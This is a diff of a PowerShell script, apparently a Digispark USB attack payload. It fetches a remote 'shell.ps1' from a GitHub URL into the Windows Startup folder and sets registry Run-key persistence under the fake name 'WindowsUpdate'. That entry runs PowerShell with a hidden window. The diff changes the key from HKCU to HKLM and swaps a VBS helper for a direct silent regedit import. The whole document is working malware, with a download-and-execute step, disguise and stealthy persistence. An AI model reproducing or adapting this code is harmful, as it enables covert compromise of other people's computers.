@@ -1,7 +1,6 @@
 $dir = $HOME+'\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\xpl.ps1'
 $RegDir = $HOME+'\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\xpl.reg'
-$RegVbs = $HOME+'\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\xpl.vbs'
-
+$xplDir = $dir.Replace("\","\\")
 $WebClient = New-Object System.Net.WebClient
 
 $WebClient.DownloadFile('https://raw.githubusercontent.com/izaelbm/Digispark/main/shell.ps1',$dir)
@@ -9,15 +8,8 @@ $WebClient.DownloadFile('https://raw.githubusercontent.com/izaelbm/Digispark/mai
 $Regfile = New-Item -Path $RegDir -ItemType "file"
 
 "Windows Registry Editor Version 5.00" >> $Regfile
-"[HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run]" >> $Regfile
-'"WindowsUpdate"="PowerShell.exe -windowstyle hidden'+$dir+'"' >> $Regfile
+"[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run]" >> $Regfile
+'"WindowsUpdate"="PowerShell.exe -windowstyle hidden '+$xplDir+'"' >> $Regfile
 
-$Regfile = New-Item -Path $RegVbs -ItemType "file"
-"Dim wShell, oExec" >> $RegVbs
-'Set wShell = CreateObject("WScript.Shell")' >> $RegVbs
-'Set oExec = wShell.Exec("regedit /s xpl.reg")' >> $RegVbs
-"Do While oExec.Status = 0" >> $RegVbs
-"      WScript.Sleep 100" >> $RegVbs
-"Loop" >> $RegVbs
+regedit.exe /s $RegDir
 
-.\$RegVbs
